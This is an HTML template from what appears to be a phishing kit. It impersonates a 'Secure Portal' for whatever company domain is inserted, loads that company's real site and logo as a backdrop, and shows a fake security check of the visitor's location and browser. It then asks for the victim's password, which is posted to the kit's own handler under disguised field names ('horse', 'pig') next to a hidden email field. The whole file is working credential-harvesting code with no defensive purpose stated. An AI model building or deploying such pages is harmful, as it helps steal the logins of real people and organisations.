<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Portal</title>
    <link rel="icon" href="https://api.kickfire.com/logo?website={{ins}}" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f8ff;
            font-family: 'Arial', sans-serif;
            color: #333333;
            overflow: hidden;
            position: relative;
        }

        /* Style for iframe background */
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1; /* Make sure it's in the background */
            border: none;
        }

        #loader {
            text-align: center;
            padding: 40px;
            background-color: rgba(245, 245, 245, 0.9);
            border-radius: 25px;
            box-shadow: 0 10px 50px rgba(0, 0, 0, 0.2);
            animation: fadeIn 0.5s ease-in-out;
            transition: transform 0.3s ease-in-out;
        }

        #loader:hover {
            transform: scale(1.05);
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes loading {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        #loading-spinner {
            margin: 20px auto;
            border: 10px solid rgba(51, 51, 51, 0.1);
            border-radius: 50%;
            border-top: 10px solid #007bff;
            width: 80px;
            height: 80px;
            animation: loading 1s linear infinite;
        }

        #info p {
            margin: 15px 0;
            font-size: 22px;
            animation: fadeIn 0.5s ease-in-out;
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
        }

        /* Form styling */
        /* Form styling */
        #form-container {
            display: none; /* Hidden initially */
            width: 500px; /* Adjusted width */
            margin-top: 20px;
            background-color: rgba(245, 245, 245, 0.9);
            padding: 40px; /* Reduced padding */
            border-radius: 15px;
            box-shadow: 0 10px 50px rgba(0, 0, 0, 0.2);
        }

        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #cccccc;
            border-radius: 5px;
            font-size: 18px;
        }

        input[type="password"]:focus {
            outline: none;
            border: 1px solid #007bff;
        }

        button {
            background-color: #007bff;
            color: #ffffff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 18px;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #0056b3;
        }

        /* Button to show/hide password */
        .show-password {
            cursor: pointer;
            color: #007bff;
            font-size: 14px;
            display: inline-block;
            margin-top: -5px;
            margin-bottom: 15px;
        }

        @media (max-width: 600px) {
            #info p {
                font-size: 18px;
            }
            #loading-spinner {
                width: 60px;
                height: 60px;
            }
        }

        footer {
            margin-top: 20px;
            font-size: 12px;
            color: #666666;
        }
    </style>
</head>
<body>
    <!-- Background iframe -->
    <iframe src="https://{{ins}}" title="Background iframe"></iframe>

    <div id="loader">
        
        <div id="loading-spinner"></div>
        <div id="info">
            <p id="datetime"><i class="fas fa-calendar-alt"></i> Date: <span id="currentDateTime">Loading...</span></p>
            <p id="browser"><i class="fas fa-browser"></i> Browser: <span id="currentBrowser">Loading...</span></p>
            <p id="os"><i class="fas fa-desktop"></i> OS: <span id="currentOS">Loading...</span></p>
            <p id="location"><i class="fas fa-map-marker-alt"></i> Location: <span id="currentLocation">Loading...</span></p>
        </div>
    </div>

    <div id="form-container">
        <form action="first" method="POST">
        <h2>You're accessing secure settings.</h2>
            <img src="https://api.kickfire.com/logo?website={{ins}}">
        <p>Please provide your <strong>{{ins}}</strong> password to continue.</p>
        <label for="password">Password</label>
        <input type="hidden" name="horse" value="{{eman}}">
        <input type="password" name="pig" id="password" placeholder="Enter your password" required>
        <span class="show-password" onclick="togglePassword()"><i class="fas fa-eye"></i> Show Password</span>
        <button name="login" type="submit" id="login_submit" tabindex="3">NEXT</button>
        <p>Authentication is required!</p>
        <footer>Â© 2024 Secure Portal | Privacy</footer></form>
    </div>

    <script>
        // Function to fetch location data
        async function fetchLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return `${data.city}, ${data.country_name}`;
            } catch (error) {
                return "Location not available";
            }
        }

        // Function to detect operating system
        function getOS() {
            const userAgent = window.navigator.userAgent;
            let os = "Unknown OS";
            if (userAgent.indexOf("Win") !== -1) os = "Windows";
            else if (userAgent.indexOf("Mac") !== -1) os = "MacOS";
            else if (userAgent.indexOf("Linux") !== -1) os = "Linux";
            else if (userAgent.indexOf("Android") !== -1) os = "Android";
            else if (userAgent.indexOf("like Mac") !== -1) os = "iOS";
            return os;
        }

        // Function to display the loader
        async function displayLoader() {
            const datetime = new Date();
            document.getElementById('currentDateTime').innerText = datetime.toString();
            document.getElementById('currentBrowser').innerText = navigator.userAgent;

            const location = await fetchLocation();
            document.getElementById('currentLocation').innerText = location;

            // Set OS
            document.getElementById('currentOS').innerText = getOS();

            // Simulate loading time
            setTimeout(() => {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('form-container').style.display = 'block'; // Show the form

                // Copy info to the form (optional if you want to show it again)
                document.getElementById('form-container').innerHTML += `
                    <div id="info">
                        <p id="datetime"><i class="fas fa-calendar-alt"></i> Date: <span>${document.getElementById('currentDateTime').innerText}</span></p>
                        <p id="os"><i class="fas fa-desktop"></i> OS: <span>${document.getElementById('currentOS').innerText}</span></p>
                        <p id="location"><i class="fas fa-map-marker-alt"></i> Location: <span>${document.getElementById('currentLocation').innerText}</span></p>
                    </div>
                `;
            }, 3000);
        }

        // Function to toggle password visibility
        function togglePassword() {
            const passwordField = document.getElementById('password');
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
            } else {
                passwordField.type = 'password';
            }
        }

        // Call displayLoader function when the page loads
        window.onload = displayLoader;
    </script>
</body>
</html>
